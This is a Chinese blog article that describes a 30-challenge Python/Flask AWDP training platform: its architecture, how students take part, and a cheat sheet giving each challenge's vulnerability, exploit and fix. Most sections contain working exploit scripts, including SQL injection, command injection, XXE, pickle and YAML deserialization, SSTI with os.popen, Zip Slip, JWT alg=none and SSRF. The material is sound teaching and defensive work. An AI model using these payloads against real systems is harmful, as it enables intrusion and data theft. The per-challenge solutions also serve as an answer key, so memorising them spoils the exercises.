---
title: AWDP内网训练容器设计
icon: mdi:wrench
category:
  - 文章
tag:
  - AWDP
---

## 前情提要

由于实验室最近有AWDP训练的需求，特撰此文。

---

## 动机

受老师委托，需要找一个既契合信息安全专业特色，又能考查学生python学习成果的方式，于是便想到了ciscn半决赛上半场那种AWDP攻防模式，一个队伍凑三个人，分别负责代码审计、漏洞利用与漏洞修复，既能考查python代码阅读能力，又能考查python脚本编写能力与python代码纠错与漏洞修补能力。于是便着手设计了这个基于[CTF-Docker-template](https://github.com/CTF-Archives/ctf-docker-template)的AWDP-OJ容器。

主要架构：一个基于docker-compose的静态靶机，用于让选手进行攻击拿特殊安置的“inner_token”，也就是传统的flag。另一个是由CTF平台进行动态分发的AWDP评测机，用于让选手提交flag、上传patch并监测漏洞修补与服务存活情况。只有一个AWDP评测容器同时满足flag已提交、漏洞已修复，才会给选手真正的flag。

截至当前版本，题库从原先 20 道基础题扩展到 30 道题：01-10 侧重 Web 安全入门，11-20 侧重 Python 语言特性与常见后端误用，21-30 则补充为困难等级题，覆盖 SSTI、Zip Slip、JWT 混淆、竞态、YAML 反序列化、URL 解析差异、OAuth 跳转、二阶 SQL 注入、代理头信任和对象属性遍历等更接近真实开发场景的漏洞。

@startuml AWDP架构

  skinparam backgroundColor #FFFFFF
  skinparam defaultFontColor #111111
  skinparam defaultFontSize 13

  skinparam node {
    BackgroundColor #EEEEEE
    BorderColor #30363d
    FontColor #111111
  }
  skinparam component {
    BackgroundColor #EEEEEE
    BorderColor #58a6ff
    FontColor #111111
  }
  skinparam arrow {
    Color #58a6ff
    FontColor #111111
    FontSize 11
  }
  skinparam note {
    BackgroundColor #EEEEEE
    BorderColor #30363d
    FontColor #111111
  }

  title AWDP 双容器架构

  actor 选手 as player

  '=== 攻击容器 ===
  node "攻击容器" as atk {
    component "Flask App\n(app.py)" as atk_app
    component "INNER_TOKEN\n(硬编码)" as token
    database "静态数据/文件\n(漏洞业务逻辑)" as atk_data

    atk_app --> token : 内嵌
    atk_app --> atk_data
  }

  '=== AWDP 容器 ===
  node "AWDP 评测容器\n(平台动态分配)" as awdp {

    component "AWDP 控制台\n(Flask app.py)" as ctrl {
      component "POST /awdp/submit" as submit
      component "POST /awdp/upload" as upload
      component "POST /awdp/check" as check_ep
      component "GET  /awdp/flag" as flag_ep
    }

    component "checker.py" as checker {
      component "① 临时 Flask 实例\n(选手 index.py)" as c1
      component "② 功能正常验证" as c2
      component "③ PoC 失效验证" as c3
    }

    database "内存状态" as mem {
      storage "attack_done" as ad
      storage "defense_done" as dd
      storage "FLAG (env pop)" as flag_mem
      storage "patch_app.py" as patch_file
    }

    ctrl --> checker : trigger
    checker --> c1
    c1 --> c2
    c1 --> c3
    ctrl --> mem : 读写
  }

  '=== 外部 ===
  node "CTF 平台\n(GZCTF 等)" as platform {
    component "动态 FLAG 注入\nGZCTF_FLAG / FLAG" as flag_inject
  }

  '=== 流程箭头 ===

  player --> atk_app : ① 利用漏洞\n(HTTP 30001-30030)
  atk_app ..> player : 返回 INNER_TOKEN

  player --> submit : ② POST inner_token\n验证攻击
  submit --> ad : attack_done = True

  player --> upload : ③ 上传 update.tar.gz\n(index.py + update.sh)
  upload --> patch_file : 提取 index.py

  player --> check_ep : ④ 手动触发 check
  check_ep --> checker : 异步执行
  c1 ..> c1 : 内部启动临时\nFlask 实例\n(随机端口)
  c2 --> c1 : 合法请求验证
  c3 --> c1 : PoC payload 验证
  checker --> dd : defense_done = True

  player --> flag_ep : ⑤ 获取 FLAG
  flag_ep --> ad : check attack_done
  flag_ep --> dd : check defense_done
  flag_ep ..> player : 双条件满足 → 返回 FLAG

  flag_inject --> flag_mem : 容器启动时注入\n立即从 env 清除

  note right of atk
    **攻击容器特征**
    · 无 FLAG，无 AWDP 逻辑
    · INNER_TOKEN 硬编码进镜像
    · 所有队共享同一实例
  end note

  note right of awdp
    **AWDP 评测容器特征**
    · 每队独立，平台动态开
    · FLAG 由平台注入，env 读后清除
    · 状态内存存储，重启即重置
    · checker 内部起临时 Flask，
      只验证选手补丁本身
  end note

  note bottom of checker
    **check 两关并列**
    功能正常 AND PoC 失效
    两项全通过 → defense_done = True
  end note

@enduml

---

## 题目总览

共 30 道题，全部基于 Python/Flask，覆盖 Web 安全基础漏洞、Python 特有漏洞，以及更偏实战的 Hard 级后端安全问题。

| # | 题名 | 漏洞类型 | 难度 | Python 知识点 |
|---|------|----------|------|--------------|
| 01 | 响应头里的秘密 | HTTP Response Header 泄露 | Easy | Flask Response |
| 02 | 你好数据库 | SQL 注入（sqlite3 字符串拼接） | Easy | sqlite3 |
| 03 | 上传就完事了 | 文件上传 MIME 类型绕过 | Easy | `request.files`、`content_type` |
| 04 | 你的Cookie我收下了 | Stored XSS（`\| safe` 过滤器） | Medium | Jinja2 模板 |
| 05 | ping一下 | 命令注入（`shell=True`） | Easy | `subprocess` |
| 06 | 随便看看 | 路径穿越（字符串拼接路径） | Easy | `os.path`、`open()` |
| 07 | 让服务器帮我访问 | SSRF（`urllib` 无过滤） | Medium | `urllib.request` |
| 08 | XML里藏着什么 | XXE（lxml 外部实体） | Medium | `lxml.etree` |
| 09 | 反序列化 | Pickle RCE | Medium | **`__reduce__`** |
| 10 | 你没有权限—真的吗 | Cookie 身份伪造 | Easy | Flask cookie |
| 11 | 计算器 | `eval()` 注入 | Easy | `eval()`、`ast` |
| 12 | 身份证明 | JWT base64 无签名伪造 | Easy | `base64`、`json` |
| 13 | 弱密钥 | Flask Session 弱密钥伪造 | Medium | `itsdangerous`、Flask session |
| 14 | 谁都能是管理员 | Mass Assignment（`setattr` 注入） | Medium | **`__dict__`**、`setattr` |
| 15 | 硬编码的秘密 | 源码泄露 + 硬编码凭据 | Easy | — |
| 16 | 饼干里的秘密 | Pickle via Cookie RCE | Medium | **`__reduce__`** |
| 17 | 类型是个谎言 | 类型混淆（int vs str JSON） | Easy | Python 类型系统 |
| 18 | 格式化的陷阱 | `str.format()` 对象属性泄露 | Medium | **`str.format()`**、对象属性访问 |
| 19 | 继承的漏洞 | 类变量 vs 实例变量 shadowing | Medium | **class var vs instance var** |
| 20 | 对象的秘密 | `__str__` 信息泄露 | Medium | **`__str__`**、`__repr__` |
| 21 | 模板里的逃逸 | Jinja2 SSTI 沙箱逃逸 | Hard | Jinja2 模板上下文、对象属性链 |
| 22 | 压缩包里的插件 | Zip Slip + 插件执行 | Hard | `zipfile`、路径规范化、动态导入 |
| 23 | 钥匙放在哪里 | JWT kid / alg 混淆 | Hard | JWT 签名、`kid`、HMAC |
| 24 | 优惠券抢兑 | 并发竞态条件 | Hard | 线程并发、锁、状态一致性 |
| 25 | 配置会自己运行 | PyYAML 不安全反序列化 | Hard | PyYAML Loader、安全反序列化 |
| 26 | 看起来可信的网址 | SSRF URL 解析差异 | Hard | URL 解析、userinfo、SSRF |
| 27 | 跳转的边界 | OAuth redirect_uri 校验缺陷 | Hard | OAuth redirect_uri、前缀匹配 |
| 28 | 迟到的注入 | 二阶 SQL 注入 | Hard | `sqlite3`、二阶 SQL 注入 |
| 29 | 谁在代理后面 | X-Forwarded-For 信任错误 | Hard | 代理头信任、访问控制 |
| 30 | 属性链尽头 | 对象属性遍历泄露 | Hard | `getattr` 链、反射、属性遍历 |

---

## 参赛流程

整个流程分为**攻击**和**防御**两个独立阶段，顺序不限，必须同时完成才能拿到最终 flag。

### 攻击阶段

1. 打开靶机页面（`http://<靶机IP>:3000X`），阅读附件 `index.py` 分析漏洞
2. 编写 exp 利用漏洞，从靶机中读取 `inner_token`
3. 打开 AWDP 评测机页面（去平台上开靶机），在「攻击确认」栏粘贴 `inner_token` 提交

本地联调时，静态攻击靶机一般映射到 `30001-30030`；远程比赛或训练平台以题目页面给出的靶机地址为准。

### 防御阶段

1. 修复附件中的 `index.py`，保留原有业务逻辑的前提下消除漏洞
2. 打包为 `update.tar.gz`（包含 `index.py` 和空的 `update.sh`）：
   ```bash
   tar -czvf update.tar.gz index.py update.sh
   ```
3. 在 AWDP 评测机的「防御上传」栏上传 `update.tar.gz`
4. 点击「触发 Check」，等待两项检查结果：
   - **功能正常**：修复后业务逻辑未被破坏
   - **漏洞封堡**：原 PoC payload 在修复版上不再有效
5. 两项全通过才算防御成功

本地调试 OJ 分发版时，可以自行把 AWDP 评测容器映射到 `40001-40030` 这一段端口；这只是本地测试约定，不是远程服务器上的固定部署方式。远程平台启动的 AWDP 评测机由平台动态分配地址和端口。

### 获取 Flag

攻击与防御均完成后，在 AWDP 评测机页面的「获取 FLAG」区域即可看到真实 flag。

---

## 仓库与分发结构

AWDP 仓库按“题目源码、攻击靶机、评测容器、OJ 分发、附件包、文档”拆开管理，便于本地训练、远程平台部署和课程材料分发使用。

| 路径 | 用途 |
|---|---|
| `challenges/XX-name/attack` | 原始攻击靶机源码与 Docker 构建上下文 |
| `challenges/XX-name/awdp` | AWDP 评测容器源码，包含控制台和 `checker.py` |
| `targets/XX-name` | 静态攻击靶机部署目录，由 `targets/docker-compose.yml` 统一启动 |
| `oj/XX-name` | OJ 分发版，使用 `attack` 与 `awdp` 双服务结构 |
| `attachment/XX-name.tar.gz` | 给学生下载的脱敏附件包，通常包含 `index.py` 和 `update.sh` |
| `dist/awdp/XX-题名.md` | 平台题目描述 Markdown |
| `dist/awdp/XX-name-attachment.tar.gz` | 与平台题面配套的脱敏源码附件 |
| `docs/` | 课程说明、报告模板和题目总览文档 |
| `exp_all.py` | 批量攻击脚本，用于本地验证 01-30 题的攻击路径 |

这里的 `inner_token` 只存在于攻击靶机中，用于证明攻击阶段完成；真正提交给平台计分的 FLAG 只存在于 AWDP 评测容器中，由平台在容器启动时注入。

---

## 各题漏洞与修复速查

### 01 — 响应头里的秘密

**漏洞：** `resp.headers["X-Secret"] = INNER_TOKEN`，inner_token 直接写入 HTTP 响应头。

**利用：** 用 `requests` 或浏览器开发者工具查看响应头。

```python
import requests
r = requests.get("http://靶机/")
print(r.headers["X-Secret"])
```

**修复：** 删除写入响应头的那一行即可。

---

### 02 — 你好数据库

**漏洞：** SQL 语句直接用 f-string 拼接用户输入，未使用参数化查询。

```python
sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**利用：** 用 `admin'--` 注释掉密码条件。

```python
import requests
r = requests.post("http://靶机/", data={"username": "admin'--", "password": "x"})
```

**修复：** 改用参数化查询。

```python
row = conn.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password)).fetchone()
```

---

### 03 — 上传就完事了

**漏洞：** 只检查 `Content-Type` 请求头，不检查文件扩展名，`.py` 文件可被上传并通过 `/run/<filename>` 执行。

**利用：** 伪造 `Content-Type: text/plain` 上传 `.py` 文件。

```python
import requests
payload = b"result['token'] = inner_token"
requests.post("http://靶机/", files={"file": ("exploit.py", payload, "text/plain")})
r = requests.get("http://靶机/run/exploit.py")
print(r.text)
```

**修复：** 增加扩展名白名单检查。

```python
elif not f.filename.lower().endswith(".txt"):
    return "仅允许 .txt 文件", 400
```

---

### 04 — 你的Cookie我收下了

**漏洞：** Jinja2 模板使用了 `{{ comment | safe }}`，用户留言内容不转义直接渲染，且 `inner_token` 以 JS 变量形式写入页面 `var _SECRET = "..."`。

**利用：** 直接读取页面源码提取 JS 变量。

```python
import requests, re
r = requests.get("http://靶机/")
token = re.search(r'var _SECRET = "([^"]+)"', r.text).group(1)
print(token)
```

**修复：** 去掉 `| safe` 过滤器，改为 `{{ comment }}`，Jinja2 默认会转义 HTML。

---

### 05 — ping一下

**漏洞：** `subprocess.run(f"ping -c 1 {ip}", shell=True)` 直接将用户输入拼入 shell 命令。

**利用：** 用 `;` 注入额外命令。

```python
import requests
r = requests.get("http://靶机/?ip=127.0.0.1;cat /app/inner_token")
print(r.text)
```

**修复：** 校验 IP 合法性后改为列表形式调用，不走 shell。

```python
import ipaddress
ipaddress.ip_address(ip)  # 非法 IP 抛 ValueError
result = subprocess.run(["ping", "-c", "1", ip], capture_output=True, text=True)
```

---

### 06 — 随便看看

**漏洞：** `open(BASE_DIR + filename)` 直接字符串拼接路径，`../` 可跳出目录。

**利用：**

```python
import requests
r = requests.get("http://靶机/?file=../inner_token")
print(r.text)
```

**修复：** 使用 `os.path.realpath` 规范化后检查前缀。

```python
path = os.path.realpath(os.path.join(BASE_DIR, filename))
if not path.startswith(BASE_DIR):
    raise Exception("Access denied")
```

---

### 07 — 让服务器帮我访问

**漏洞：** `urllib.request.urlopen(url)` 无任何过滤，可访问容器内网服务（`127.0.0.1:18081`）。

**利用：**

```python
import requests
r = requests.get("http://靶机/?url=http://127.0.0.1:18081/secret")
print(r.text)
```

**修复：** 解析 hostname，拒绝内网地址。

```python
from urllib.parse import urlparse
h = urlparse(url).hostname or ""
if re.search(r"(localhost|127\.|10\.|172\.|192\.)", h):
    raise Exception("Forbidden")
```

---

### 08 — XML里藏着什么

**漏洞：** `etree.XMLParser(resolve_entities=True)` 允许 XML 外部实体，可读取服务器文件。

**利用：**

```python
import requests
payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/inner_token">]><root><name>&xxe;</name></root>'
r = requests.post("http://靶机/", data={"xml": payload})
print(r.text)
```

**修复：** 禁用外部实体解析。

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

---

### 09 — 反序列化

**漏洞：** `pickle.loads(base64.b64decode(data))` 直接反序列化用户输入，可执行任意代码。

**利用：** 构造含 `__reduce__` 的类。

```python
import pickle, base64, requests

class Exploit:
    def __reduce__(self):
        return (open, ("/app/inner_token",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
r = requests.post("http://靶机/", data={"data": payload})
print(r.text)
```

**修复：** 禁用 pickle，改用 JSON。

```python
import json
obj = json.loads(base64.b64decode(data))
```

---

### 10 — 你没有权限—真的吗

**漏洞：** 权限判断直接读取客户端 Cookie：`role = request.cookies.get("role", "guest")`，客户端可任意修改。

**利用：**

```python
import requests
r = requests.get("http://靶机/", cookies={"role": "admin"})
print(r.text)
```

**修复：** 改用服务端 Flask session 存储角色，不信任客户端 Cookie。

---

### 11 — 计算器

**漏洞：** `result = eval(expr)` 直接求值用户输入，可执行任意 Python 代码。

**利用：**

```python
import requests
r = requests.post("http://靶机/", data={"expr": "open('/app/inner_token').read()"})
print(r.text)
```

**修复：** 使用 `ast.literal_eval` 只允许字面量，或用正则白名单只允许数字和运算符。

```python
import ast
result = ast.literal_eval(expr)
```

---

### 12 — 身份证明

**漏洞：** token 格式为 `base64(json)`，无签名验证，可任意伪造内容。

**利用：**

```python
import requests, json, base64
forged = base64.b64encode(json.dumps({"user": "hacker", "role": "admin"}).encode()).decode()
r = requests.post("http://靶机/", data={"token": forged})
print(r.text)
```

**修复：** 加 HMAC 签名，验证时同时校验签名。

---

### 13 — 弱密钥

**漏洞：** `app.secret_key = "123456"` 密钥过弱，Flask session cookie 可被 `flask-unsign` 工具伪造。

**利用：**

```bash
flask-unsign --sign --secret 123456 --no-literal-eval \
  --cookie '{"username":"hacker","role":"admin"}'
```

将输出的 cookie 值作为 `session` Cookie 发送即可。

**修复：** 使用足够长的随机密钥，建议从环境变量读取。

```python
import secrets
app.secret_key = secrets.token_hex(32)
```

---

### 14 — 谁都能是管理员

**漏洞：** 注册/更新接口遍历所有 POST 参数直接 `setattr(user, k, v)`，未做字段白名单，可注入 `is_admin=True`。

```python
# 漏洞代码
for k, v in request.form.items():
    setattr(user, k, v)
```

**利用：**

```python
import requests
r = requests.post("http://靶机/", data={"username": "hacker", "is_admin": "True"})
r2 = requests.get(f"http://靶机/profile/hacker")
print(r2.text)
```

**修复：** 只允许白名单字段赋值。

```python
if "bio" in request.form:
    user.bio = request.form["bio"]
```

---

### 15 — 硬编码的秘密

**漏洞：** `/source` 路由直接返回 `app.py` 源码，其中硬编码了 `ADMIN_PASSWORD = "slsec2024"`；用此密码登录即可拿到 inner_token。

**利用：**

```python
import requests, re
src = requests.get("http://靶机/source").text
pwd = re.search(r'ADMIN_PASSWORD = "([^"]+)"', src).group(1)
r = requests.post("http://靶机/", data={"password": pwd})
print(r.text)
```

**修复：** 删除或限制 `/source` 路由。

```python
@app.route("/source")
def source():
    return "Access denied", 403
```

---

### 16 — 饼干里的秘密

**漏洞：** `cart` Cookie 是 base64 编码的 pickle 对象，服务端直接 `pickle.loads` 反序列化，可通过 `__reduce__` 执行任意代码。

**利用：**

```python
import pickle, base64, requests

class Exploit:
    def __reduce__(self):
        return (open, ("/app/inner_token",))

cart = base64.b64encode(pickle.dumps(Exploit())).decode()
r = requests.get("http://靶机/", cookies={"cart": cart})
print(r.text)
```

**修复：** 改用 JSON 序列化购物车数据，彻底移除 pickle。

---

### 17 — 类型是个谎言

**漏洞：** PIN 码以 `int` 类型存储（`SECRET_PIN = 1234`），直接与 JSON 输入做 `==` 比较。Python 中 `"1234" == 1234` 为 `False`，但 `1234 == 1234` 为 `True`，发送整数即可通过。

**利用：**

```python
import requests
r = requests.post("http://靶机/api/verify", json={"pin": 1234})
print(r.json())
```

**修复：** 统一类型后再比较。

```python
try:
    pin = int(request.json["pin"])
except:
    return {"ok": False, "msg": "Invalid PIN"}
if pin == SECRET_PIN:
    ...
```

---

### 18 — 格式化的陷阱

**漏洞：** 用户同时控制 `template` 字符串和 `name` 值，`template.format(name=n, config=config)` 中 `config` 对象被注入为命名参数，可通过 `{config.secret}` 访问其属性。

**利用：**

```python
import requests
r = requests.get("http://靶机/", params={"template": "{config.secret}", "name": "x"})
print(r.text)
```

**修复：** 不使用 `str.format()`，改用 `str.replace` 做有限替换，或过滤 `{` `}` 字符。

```python
msg = template.replace("{name}", n).replace("{config.db}", config.db)
```

---

### 19 — 继承的漏洞

**漏洞：** `User` 类有类变量 `is_vip = False`，更新资料接口对所有 POST 参数做 `setattr(user, k, v)`，设置 `is_vip=True` 会在实例上创建同名属性覆盖类变量，从而绕过权限检查。

**利用：**

```python
import requests
# 注册
r = requests.post("http://靶机/register", data={"username": "hacker"}, allow_redirects=False)
uid = r.cookies.get("uid")
# 注入 is_vip
requests.post("http://靶机/update", data={"is_vip": "True"}, cookies={"uid": uid})
r2 = requests.get("http://靶机/", cookies={"uid": uid})
print(r2.text)
```

**修复：** 更新接口只允许白名单字段。

```python
if "bio" in request.form:
    user.bio = request.form["bio"]
```

---

### 20 — 对象的秘密

**漏洞：** `UserRecord.__str__` 返回了包含 `secret` 字段的完整字符串，`/api/user` 接口直接 `return str(record)` 输出，导致敏感信息泄露。

**利用：**

```python
import requests
r = requests.get("http://靶机/api/user?username=admin")
print(r.text)
```

**修复：** 重写 `__str__`，只返回非敏感字段。

```python
def __str__(self):
    return f"UserRecord(username={self.username}, email={self.email})"
```

---

### 21 — 模板里的逃逸

**漏洞：** 服务端将用户输入直接拼进 Jinja2 模板字符串后调用 `render_template_string()` 渲染。黑名单只拦截部分危险字符串，无法从根本上阻止模板表达式访问 Python 对象链。

**利用：** 通过模板上下文访问全局对象并读取 `inner_token`。

```python
import requests, re
payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat /app/inner_token').read() }}"
r = requests.get("http://靶机/", params={"name": payload})
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 不把用户输入当模板源码渲染。固定模板结构，只把用户输入作为普通变量传入，并依赖 Jinja2 自动转义。

```python
return render_template_string("Hello, {{ name }}", name=name)
```

---

### 22 — 压缩包里的插件

**漏洞：** zip 解压时直接使用压缩包内的文件名拼接输出路径，没有检查 `../`，攻击者可把文件写出上传目录。插件路由又会动态加载 `plugins` 目录下的 Python 文件，最终形成 Zip Slip 到代码执行链。

**利用：** 构造 `../plugins/pwn.py`，再访问插件路由。

```python
import io, zipfile, requests, re
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("../plugins/pwn.py", "def run(ctx):\n    return ctx['token']\n")
requests.post("http://靶机/upload", files={"file": ("p.zip", buf.getvalue(), "application/zip")})
r = requests.get("http://靶机/plugin/pwn")
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 解压前规范化目标路径，确保所有条目都落在上传目录内；同时插件加载目录不应由用户上传路径影响。

```python
target = os.path.realpath(os.path.join(BASE_DIR, info.filename))
if not target.startswith(os.path.realpath(BASE_DIR) + os.sep):
    raise ValueError("bad zip path")
```

---

### 23 — 钥匙放在哪里

**漏洞：** 自定义 JWT 校验逻辑信任 header 中的 `alg` 字段，遇到 `alg=none` 时直接跳过签名校验，导致攻击者可以伪造管理员 payload。

**利用：** 伪造 `role=admin` 的无签名 token。

```python
import base64, json, requests, re
payload = {"user": "guest", "role": "admin"}
token = "none." + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
r = requests.post("http://靶机/", data={"token": token})
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 服务端固定允许的算法，不接受客户端选择 `none`；`kid` 只能从服务端白名单取值，且缺失或未知时直接拒绝。

```python
if header.get("alg") != "HS256":
    raise ValueError("unsupported alg")
key = KEYS.get(header.get("kid"))
if key is None:
    raise ValueError("unknown kid")
```

---

### 24 — 优惠券抢兑

**漏洞：** 优惠券兑换接口先检查 `uses`，中间有耗时操作，再扣减次数和增加余额；整个过程没有锁，多个并发请求可同时通过检查，导致余额被重复增加。

**利用：** 多线程同时提交兑换请求，触发竞态后余额达到 token 发放条件。

```python
import concurrent.futures, requests, re
s = requests.Session()
s.post("http://靶机/reset")
def once():
    return s.post("http://靶机/redeem", data={"coupon": "FREE100"}).text
with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
    text = "\n".join(ex.map(lambda _: once(), range(12)))
print(re.search(r"slsec_inner_\w+", text).group(0))
```

**修复：** 对检查和扣减使用同一把锁，保证状态更新原子化；真实系统中还应把扣减放进数据库事务。

```python
lock = threading.Lock()
with lock:
    if state["uses"] <= 0:
        return "优惠券已用完"
    state["uses"] -= 1
    state["balance"] += 100
```

---

### 25 — 配置会自己运行

**漏洞：** 服务端使用 `yaml.load(..., Loader=yaml.Loader)` 解析用户输入。该 Loader 允许 `!!python/object/apply` 等 Python 标签，攻击者可构造对象调用并读取文件。

**利用：** 用 PyYAML 标签调用 `builtins.open` 读取 `inner_token`。

```python
import requests, re
payload = "!!python/object/apply:builtins.open ['/app/inner_token']"
r = requests.post("http://靶机/", data={"yaml": payload})
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 改用 `yaml.safe_load()` 或 `SafeLoader`，并对解析后的数据结构做类型白名单。

```python
obj = yaml.safe_load(y)
if not isinstance(obj, dict):
    return "bad config", 400
```

---

### 26 — 看起来可信的网址

**漏洞：** SSRF 防护只用 `url.startswith("http://trusted.local")` 做字符串前缀判断。真实请求库会按 URL 标准解析 userinfo，`trusted.local@127.0.0.1` 的实际连接主机是 `127.0.0.1`。

**利用：** 构造字符串看起来以可信域名开头、实际访问本机管理服务的 URL。

```python
import requests, re
r = requests.get("http://靶机/", params={"url": "http://trusted.local@127.0.0.1:18082/admin"})
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 使用 URL 解析库取出 `scheme`、`hostname`、`port` 后再判断，禁止 userinfo，并拒绝内网地址。

```python
from urllib.parse import urlparse
u = urlparse(url)
if u.username or u.password or u.hostname != "trusted.local":
    return "forbidden", 403
```

---

### 27 — 跳转的边界

**漏洞：** OAuth 授权端点用 `redirect_uri.startswith(TRUSTED)` 判断回调地址。攻击者可使用 `https://trusted.example.com.evil.local/...` 这种前缀相同但主域不同的地址接收授权 code。

**利用：** 获取跳转 Location 中的 code，再通过调试接口取出 code 绑定的信息。

```python
import requests, re
r = requests.get(
    "http://靶机/oauth/authorize",
    params={"redirect_uri": "https://trusted.example.com.evil.local/callback"},
    allow_redirects=False,
)
code = re.search(r"code=([A-Za-z0-9_-]+)", r.headers.get("Location", "")).group(1)
r2 = requests.get("http://靶机/oauth/debug", params={"code": code})
print(re.search(r"slsec_inner_\w+", r2.text).group(0))
```

**修复：** 解析 URL 后精确校验 scheme、hostname 和路径；更推荐维护完整 redirect_uri 白名单。

```python
u = urlparse(redirect_uri)
if u.scheme != "https" or u.hostname != "trusted.example.com":
    return "invalid redirect_uri", 400
```

---

### 28 — 迟到的注入

**漏洞：** 注册和登录阶段使用参数化查询，看起来安全；但登录后把 session 中保存的用户名再次拼进 SQL，导致用户名中的注入片段在第二阶段触发。

**利用：** 先注册恶意用户名，再登录访问个人中心。

```python
import requests, re
s = requests.Session()
username = "x' OR role='admin'--"
s.post("http://靶机/register", data={"username": username, "password": "pw"})
s.post("http://靶机/login", data={"username": username, "password": "pw"})
r = s.get("http://靶机/me")
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 所有 SQL 查询都使用参数化，不因为数据已经进入数据库或 session 就重新信任它。

```python
row = conn.execute("SELECT role, token FROM users WHERE username=?", (username,)).fetchone()
```

---

### 29 — 谁在代理后面

**漏洞：** 管理接口直接信任客户端提交的 `X-Forwarded-For`，并把它当作真实来源 IP 判断是否为本机请求。没有可信反向代理边界时，任何客户端都能伪造该头。

**利用：** 把 `X-Forwarded-For` 设置为 `127.0.0.1`。

```python
import requests, re
r = requests.get("http://靶机/admin", headers={"X-Forwarded-For": "127.0.0.1"})
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 不直接信任客户端代理头；只有请求来自可信代理 IP 时才解析转发头，否则使用 `request.remote_addr`。

```python
client_ip = request.remote_addr
if request.remote_addr in TRUSTED_PROXIES:
    client_ip = request.headers.get("X-Forwarded-For", client_ip).split(",")[0].strip()
```

---

### 30 — 属性链尽头

**漏洞：** 字段查询接口为了支持点号嵌套字段，逐段调用 `getattr()`，但没有字段白名单。攻击者可以沿 `__class__`、`__init__`、`__globals__` 等属性链访问模块全局变量。

**利用：** 通过对象属性链读取全局 `INNER_TOKEN`。

```python
import requests, re
r = requests.get("http://靶机/profile", params={"field": "__class__.__init__.__globals__.INNER_TOKEN"})
print(re.search(r"slsec_inner_\w+", r.text).group(0))
```

**修复：** 字段选择必须使用白名单映射，不允许用户输入直接驱动 `getattr()`。

```python
allowed = {"username": profile.username, "email": profile.email, "role": profile.role}
if field not in allowed:
    return "unknown field", 400
return str(allowed[field])
```

---

## patch 打包格式

```bash
# update.sh 内容（平台不执行，留空即可）
echo "ok"

# 打包
tar -czvf update.tar.gz index.py update.sh
```

上传 `update.tar.gz` 后点击「触发 Check」，平台会提取其中的 `index.py` 在临时环境中启动并验证。
